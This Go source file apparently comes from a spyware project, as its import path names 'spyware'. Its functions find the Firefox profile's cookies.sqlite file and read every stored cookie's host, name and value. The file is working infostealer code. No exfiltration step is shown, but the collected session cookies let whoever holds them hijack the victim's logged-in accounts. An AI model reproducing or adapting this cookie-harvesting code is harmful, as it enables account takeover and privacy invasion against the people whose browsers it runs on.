package firefox

import (
	"database/sql"
	"fmt"
	"os"
	"path/filepath"

	"github.com/Nevesto/spyware/models"
	_ "modernc.org/sqlite"
)

func FindCookieFile() (string, error) {
	profilePaths, err := GetFirefoxProfilePaths()
	if err != nil {
		return "", fmt.Errorf("failed to get Firefox profile paths: %w", err)
	}

	for _, profile := range profilePaths {
		cookieFile := filepath.Join(profile, "cookies.sqlite")
		if _, err := os.Stat(cookieFile); err == nil {
			return cookieFile, nil
		}
	}

	return "", fmt.Errorf("Firefox Cookies file not found")
}



func ReadCookies(cookieFile string) ([]models.Cookie, error) {
	db, err := sql.Open("sqlite", cookieFile)
	if err != nil {
		return nil, err
	}
	defer db.Close()

	rows, err := db.Query("SELECT host, name, value FROM moz_cookies")
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var cookies []models.Cookie
	for rows.Next() {
		var cookie models.Cookie
		if err := rows.Scan(&cookie.HostKey, &cookie.Name, &cookie.Value); err != nil {
			return nil, err
		}
		cookies = append(cookies, cookie)
	}

	return cookies, nil
}
